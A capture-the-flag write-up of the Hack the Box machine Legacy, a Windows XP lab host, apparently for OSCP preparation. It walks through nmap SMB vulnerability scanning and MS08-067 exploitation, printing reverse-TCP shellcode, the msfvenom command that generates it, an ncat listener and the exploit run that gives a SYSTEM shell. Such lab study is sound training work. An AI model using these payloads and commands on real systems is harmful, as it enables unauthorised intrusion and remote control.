Title: Legacy - Hack the Box
Date: 2020-02-13
Modified: 2020-02-13
Category: ctf
Tags: ctf, hack the box, oscp prep
Slug: htb-legacy
Authors: Riley
Summary: Guide to Legacy on Hack the Box.

## Description

Legacy is a  Windows XP machine with a straight shot to system using a well-known SMB exploit.

Legacy is assigned IP 10.10.10.4.

## Reconnaissance

We begin by initiating an Nmap scan.

#### Nmap
```bash
# nmap -sC -sV -oA nmap/Legacy 10.10.10.4

Nmap scan report for 10.10.10.4
Host is up (0.094s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: -3h58m09s, deviation: 1h24m51s, median: -4h58m09s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:7c:12 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-02-12T02:36:03+02:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

The operating system appears to be Windows XP.  XP has several known vulnerabilities, many for the SMB protocol.  To get more information, we can use the Nmap Scripting Engine (NSE) scripts.  We can locate them with the `locate` command.

```bash
# locate .nse | head
/usr/share/exploitdb/exploits/hardware/webapps/31527.nse
/usr/share/exploitdb/exploits/multiple/remote/33310.nse
/usr/share/nmap/scripts/acarsd-info.nse
/usr/share/nmap/scripts/address-info.nse
/usr/share/nmap/scripts/afp-brute.nse
/usr/share/nmap/scripts/afp-ls.nse
/usr/share/nmap/scripts/afp-path-vuln.nse
/usr/share/nmap/scripts/afp-serverinfo.nse
/usr/share/nmap/scripts/afp-showmount.nse
/usr/share/nmap/scripts/ajp-auth.nse
[SNIP...]
```

All the NSE scripts we need are located in the `/usr/share/nmap/scripts/` directory.  We can locate SMB vulnerability checkers by filtering the contents of the directory.

```bash
# ls /usr/share/nmap/scripts/ | grep smb | grep vuln
smb2-vuln-uptime.nse
smb-vuln-conficker.nse
smb-vuln-cve2009-3103.nse
smb-vuln-cve-2017-7494.nse
smb-vuln-ms06-025.nse
smb-vuln-ms07-029.nse
smb-vuln-ms08-067.nse
smb-vuln-ms10-054.nse
smb-vuln-ms10-061.nse
smb-vuln-ms17-010.nse
smb-vuln-regsvc-dos.nse
smb-vuln-webexec.nse
```

Perfect!  To use a script with nmap, we need to set the `--script` flag, like below.  It can accept wildcards as input, which is extremely useful for identifying all of the above scripts.

```bash
# nmap -p 139 -sV --script=smb-vuln* 10.10.10.4

Nmap scan report for 10.10.10.4
Host is up (0.085s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```

The box appears to be vulnerable to both [ms08-067](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067) and [ms17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010).  These are both worth investigating, but this post will cover ms08-067.

## Getting System with ms08-067

Some browsing reveals a nice [Github repo](https://github.com/andyacer/ms08_067) for ms08-067 hosted by Github user _andyacer_.  The README states that we need Impacket 0_9_17, and helpfully provides the instructions on installing it:

```bash
git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
cd impacket
pip install .
```

Then we can clone the exploit repository.

```bash
# git clone https://github.com/andyacer/ms08_067
Cloning into 'ms08_067'...
remote: Enumerating objects: 37, done.
remote: Total 37 (delta 0), reused 0 (delta 0), pack-reused 37
Unpacking objects: 100% (37/37), 13.00 KiB | 2.60 MiB/s, done.
# cd ms08_067/
/ms08_067# ls
LICENSE  ms08_067_2018.py  README.md
```

Based on the source code, we will need to generate our own shellcode that the exploit will execute.  The script provides some sample commands for `msfvenom`.

#### ms08-067.py shellcode section

```python
# ------------------------------------------------------------------------
# REPLACE THIS SHELLCODE with shellcode generated for your use
# Note that length checking logic follows this section, so there's no need to count bytes or bother with NOPS.
#
# Example msfvenom commands to generate shellcode:
# msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.229 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

# Reverse TCP to 10.11.0.157 port 62000:
shellcode=(
"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x42\xf6\xc3\xef\x83\xee\xfc\xe2\xf4\xbe\x1e\x41\xef\x42\xf6"
"\xa3\x66\xa7\xc7\x03\x8b\xc9\xa6\xf3\x64\x10\xfa\x48\xbd\x56"
"\x7d\xb1\xc7\x4d\x41\x89\xc9\x73\x09\x6f\xd3\x23\x8a\xc1\xc3"
"\x62\x37\x0c\xe2\x43\x31\x21\x1d\x10\xa1\x48\xbd\x52\x7d\x89"
"\xd3\xc9\xba\xd2\x97\xa1\xbe\xc2\x3e\x13\x7d\x9a\xcf\x43\x25"
"\x48\xa6\x5a\x15\xf9\xa6\xc9\xc2\x48\xee\x94\xc7\x3c\x43\x83"
"\x39\xce\xee\x85\xce\x23\x9a\xb4\xf5\xbe\x17\x79\x8b\xe7\x9a"
"\xa6\xae\x48\xb7\x66\xf7\x10\x89\xc9\xfa\x88\x64\x1a\xea\xc2"
"\x3c\xc9\xf2\x48\xee\x92\x7f\x87\xcb\x66\xad\x98\x8e\x1b\xac"
"\x92\x10\xa2\xa9\x9c\xb5\xc9\xe4\x28\x62\x1f\x9e\xf0\xdd\x42"
"\xf6\xab\x98\x31\xc4\x9c\xbb\x2a\xba\xb4\xc9\x45\x09\x16\x57"
"\xd2\xf7\xc3\xef\x6b\x32\x97\xbf\x2a\xdf\x43\x84\x42\x09\x16"
"\xbf\x12\xa6\x93\xaf\x12\xb6\x93\x87\xa8\xf9\x1c\x0f\xbd\x23"
"\x54\x85\x47\x9e\xc9\xe4\x42\x6b\xab\xed\x42\x04\xf3\x66\xa4"
"\x9c\xd3\xb9\x15\x9e\x5a\x4a\x36\x97\x3c\x3a\xc7\x36\xb7\xe3"
"\xbd\xb8\xcb\x9a\xae\x9e\x33\x5a\xe0\xa0\x3c\x3a\x2a\x95\xae"
"\x8b\x42\x7f\x20\xb8\x15\xa1\xf2\x19\x28\xe4\x9a\xb9\xa0\x0b"
"\xa5\x28\x06\xd2\xff\xee\x43\x7b\x87\xcb\x52\x30\xc3\xab\x16"
"\xa6\x95\xb9\x14\xb0\x95\xa1\x14\xa0\x90\xb9\x2a\x8f\x0f\xd0"
"\xc4\x09\x16\x66\xa2\xb8\x95\xa9\xbd\xc6\xab\xe7\xc5\xeb\xa3"
"\x10\x97\x4d\x23\xf2\x68\xfc\xab\x49\xd7\x4b\x5e\x10\x97\xca"
"\xc5\x93\x48\x76\x38\x0f\x37\xf3\x78\xa8\x51\x84\xac\x85\x42"
"\xa5\x3c\x3a"
)
# ------------------------------------------------------------------------
```

#### Generating shellcode

We can generate our own shellcode using msfvenom.  Here is the command I used and an explanation of the switches I enabled:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.33 LPORT=4433 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -a x86 --platform windows -v shellcode
```

 * `-p windows/shell_reverse_tcp`	Creates a reverse TCP stream from a Windows host.
 * `LHOST=10.10.14.33`	Sets the IP for the reverse shell to connect to; this is almost always an attacker-controlled machine.
 * `LPORT=4433`	Sets the port that the reverse shell attempts to connect to.
 * `EXITFUNC=thread`	Ensures that the exploit won't quit out after the shellcode executes.
 * `-b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"`	Sets the bad characters; msfvenom will avoid using these in the shellcode. Null bytes '\x00' are a common setting.
 * `-f python`	Output format, set to Python since the script is in Python. The default is C, but either can work with a little editing.
 * `-a x86`	The architecture of the target, most likely x86, 32 bit.
 * `--platform windows`	Sets the target platform, in this case Windows. Msfvenom is smart enough to infer the target platform without this setting based on the module reverse shell we selected earlier, but explicit settings can't hurt.
 * `-v shellcode`	Changes the name of the shellcode variable from `buf` to `shellcode`, which is the one used in the exploit.

Which outputs this shellcode:

```python
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of python file: 1953 bytes
shellcode =  b""
shellcode += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x93\xb9\x8e\xef\x83\xee\xfc"
shellcode += b"\xe2\xf4\x6f\x51\x0c\xef\x93\xb9\xee\x66\x76"
shellcode += b"\x88\x4e\x8b\x18\xe9\xbe\x64\xc1\xb5\x05\xbd"
shellcode += b"\x87\x32\xfc\xc7\x9c\x0e\xc4\xc9\xa2\x46\x22"
shellcode += b"\xd3\xf2\xc5\x8c\xc3\xb3\x78\x41\xe2\x92\x7e"
shellcode += b"\x6c\x1d\xc1\xee\x05\xbd\x83\x32\xc4\xd3\x18"
shellcode += b"\xf5\x9f\x97\x70\xf1\x8f\x3e\xc2\x32\xd7\xcf"
shellcode += b"\x92\x6a\x05\xa6\x8b\x5a\xb4\xa6\x18\x8d\x05"
shellcode += b"\xee\x45\x88\x71\x43\x52\x76\x83\xee\x54\x81"
shellcode += b"\x6e\x9a\x65\xba\xf3\x17\xa8\xc4\xaa\x9a\x77"
shellcode += b"\xe1\x05\xb7\xb7\xb8\x5d\x89\x18\xb5\xc5\x64"
shellcode += b"\xcb\xa5\x8f\x3c\x18\xbd\x05\xee\x43\x30\xca"
shellcode += b"\xcb\xb7\xe2\xd5\x8e\xca\xe3\xdf\x10\x73\xe6"
shellcode += b"\xd1\xb5\x18\xab\x65\x62\xce\xd1\xbd\xdd\x93"
shellcode += b"\xb9\xe6\x98\xe0\x8b\xd1\xbb\xfb\xf5\xf9\xc9"
shellcode += b"\x94\x46\x5b\x57\x03\xb8\x8e\xef\xba\x7d\xda"
shellcode += b"\xbf\xfb\x90\x0e\x84\x93\x46\x5b\xbf\xc3\xe9"
shellcode += b"\xde\xaf\xc3\xf9\xde\x87\x79\xb6\x51\x0f\x6c"
shellcode += b"\x6c\x19\x85\x96\xd1\x84\xe5\x9d\x98\xe6\xed"
shellcode += b"\x93\xa8\xdf\x66\x75\xd3\x9e\xb9\xc4\xd1\x17"
shellcode += b"\x4a\xe7\xd8\x71\x3a\x16\x79\xfa\xe3\x6c\xf7"
shellcode += b"\x86\x9a\x7f\xd1\x7e\x5a\x31\xef\x71\x3a\xfb"
shellcode += b"\xda\xe3\x8b\x93\x30\x6d\xb8\xc4\xee\xbf\x19"
shellcode += b"\xf9\xab\xd7\xb9\x71\x44\xe8\x28\xd7\x9d\xb2"
shellcode += b"\xee\x92\x34\xca\xcb\x83\x7f\x8e\xab\xc7\xe9"
shellcode += b"\xd8\xb9\xc5\xff\xd8\xa1\xc5\xef\xdd\xb9\xfb"
shellcode += b"\xc0\x42\xd0\x15\x46\x5b\x66\x73\xf7\xd8\xa9"
shellcode += b"\x6c\x89\xe6\xe7\x14\xa4\xee\x10\x46\x02\x6e"
shellcode += b"\xf2\xb9\xb3\xe6\x49\x06\x04\x13\x10\x46\x85"
shellcode += b"\x88\x93\x99\x39\x75\x0f\xe6\xbc\x35\xa8\x80"
shellcode += b"\xcb\xe1\x85\x93\xea\x71\x3a"
```

After pasting, the finished result should have your shellcode in place of the original, like so:

```python
#------------------------------------------------------------------------                                                                      
# REPLACE THIS SHELLCODE with shellcode generated for your use
[SNIP]


# Reverse TCP to 10.10.14.33 on port 4433:
# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.33 LPORT=4433 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -a x86 --platform windows -v shellcode

shellcode =  b""
shellcode += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x93\xb9\x8e\xef\x83\xee\xfc"
shellcode += b"\xe2\xf4\x6f\x51\x0c\xef\x93\xb9\xee\x66\x76"
shellcode += b"\x88\x4e\x8b\x18\xe9\xbe\x64\xc1\xb5\x05\xbd"
shellcode += b"\x87\x32\xfc\xc7\x9c\x0e\xc4\xc9\xa2\x46\x22"
shellcode += b"\xd3\xf2\xc5\x8c\xc3\xb3\x78\x41\xe2\x92\x7e"
shellcode += b"\x6c\x1d\xc1\xee\x05\xbd\x83\x32\xc4\xd3\x18"
shellcode += b"\xf5\x9f\x97\x70\xf1\x8f\x3e\xc2\x32\xd7\xcf"
shellcode += b"\x92\x6a\x05\xa6\x8b\x5a\xb4\xa6\x18\x8d\x05"
shellcode += b"\xee\x45\x88\x71\x43\x52\x76\x83\xee\x54\x81"
shellcode += b"\x6e\x9a\x65\xba\xf3\x17\xa8\xc4\xaa\x9a\x77"
shellcode += b"\xe1\x05\xb7\xb7\xb8\x5d\x89\x18\xb5\xc5\x64"
shellcode += b"\xcb\xa5\x8f\x3c\x18\xbd\x05\xee\x43\x30\xca"
shellcode += b"\xcb\xb7\xe2\xd5\x8e\xca\xe3\xdf\x10\x73\xe6"
shellcode += b"\xd1\xb5\x18\xab\x65\x62\xce\xd1\xbd\xdd\x93"
shellcode += b"\xb9\xe6\x98\xe0\x8b\xd1\xbb\xfb\xf5\xf9\xc9"
shellcode += b"\x94\x46\x5b\x57\x03\xb8\x8e\xef\xba\x7d\xda"
shellcode += b"\xbf\xfb\x90\x0e\x84\x93\x46\x5b\xbf\xc3\xe9"
shellcode += b"\xde\xaf\xc3\xf9\xde\x87\x79\xb6\x51\x0f\x6c"
shellcode += b"\x6c\x19\x85\x96\xd1\x84\xe5\x9d\x98\xe6\xed"
shellcode += b"\x93\xa8\xdf\x66\x75\xd3\x9e\xb9\xc4\xd1\x17"
shellcode += b"\x4a\xe7\xd8\x71\x3a\x16\x79\xfa\xe3\x6c\xf7"
shellcode += b"\x86\x9a\x7f\xd1\x7e\x5a\x31\xef\x71\x3a\xfb"
shellcode += b"\xda\xe3\x8b\x93\x30\x6d\xb8\xc4\xee\xbf\x19"
shellcode += b"\xf9\xab\xd7\xb9\x71\x44\xe8\x28\xd7\x9d\xb2"
shellcode += b"\xee\x92\x34\xca\xcb\x83\x7f\x8e\xab\xc7\xe9"
shellcode += b"\xd8\xb9\xc5\xff\xd8\xa1\xc5\xef\xdd\xb9\xfb"
shellcode += b"\xc0\x42\xd0\x15\x46\x5b\x66\x73\xf7\xd8\xa9"
shellcode += b"\x6c\x89\xe6\xe7\x14\xa4\xee\x10\x46\x02\x6e"
shellcode += b"\xf2\xb9\xb3\xe6\x49\x06\x04\x13\x10\x46\x85"
shellcode += b"\x88\x93\x99\x39\x75\x0f\xe6\xbc\x35\xa8\x80"
shellcode += b"\xcb\xe1\x85\x93\xea\x71\x3a"

# ------------------------------------------------------------------------
```

Executing the script without any arguments reveals the usage isntructions.

```bash
/ms08_067# python ./ms08_067_2018.py 
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer:
#   - Added support for selecting a target port at the command line.
#     It seemed that only 445 was previously supported.
#   - Changed library calls to correctly establish a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste
#     into this source file.
#######################################################################


Usage: ./ms08_067_2018.py <target ip> <os #> <Port #>

Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)

Also: nmap has a good OS discovery script that pairs well with this exploit:
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1
```

Of note are the several `os #` options; it looks like the exact exploitation is language-dependent.  Legacy is an English box, so the most likely exploits should be 6 or 7.

First, we need to set up an Ncat listener (I use `rlwrap` for [fancy features](https://twitter.com/pix/status/1198688097665503232)).  Remember to set the port to the one you specified for your shellcode.

```bash
# rlwrap ncat -nvlp 4433
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4433
Ncat: Listening on 0.0.0.0:4433
```

Next, we execute the python exploit with the target IP, OS #, and port.  I will be attempting 6 first.

#### Executing the exploit to get a reverse shell

```bash
/ms08_067# python ./ms08_067_2018.py 10.10.10.4 6 445#######################################################################
#   MS08-067 Exploit
[SNIP]

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish

```

Back in the listener:

```shell
Ncat: Connection from 10.10.10.4.
Ncat: Connection from 10.10.10.4:1028.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

Shell on first try!

```shell
C:\WINDOWS\system32>whoami & hostname
whoami & hostname
'whoami' is not recognized as an internal or external command,
operable program or batch file.
legacy
```

The error displayed from `whoami`, combined with the knowledge that this is an SMB exploit, are good indicators that this process is running as `NT AUTHORITY\SYSTEM`.

We can locate the `user.txt` and `root.txt` flags in the john and Administrator user directories respectively.

```shell
C:\WINDOWS\system32>dir "C:\Documents and Settings\john\Desktop"
dir "C:\Documents and Settings\john\Desktop"
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  08:19     <DIR>          .
16/03/2017  08:19     <DIR>          ..
16/03/2017  08:19                 32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.485.225.472 bytes free

C:\WINDOWS\system32>dir "C:\Documents and Settings\Administrator\Desktop"
dir "C:\Documents and Settings\Administrator\Desktop"
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator\Desktop

16/03/2017  08:18     <DIR>          .
16/03/2017  08:18     <DIR>          ..
16/03/2017  08:18                 32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.485.225.472 bytes free


```

Thus concludes Legacy.  Thank you for reading!

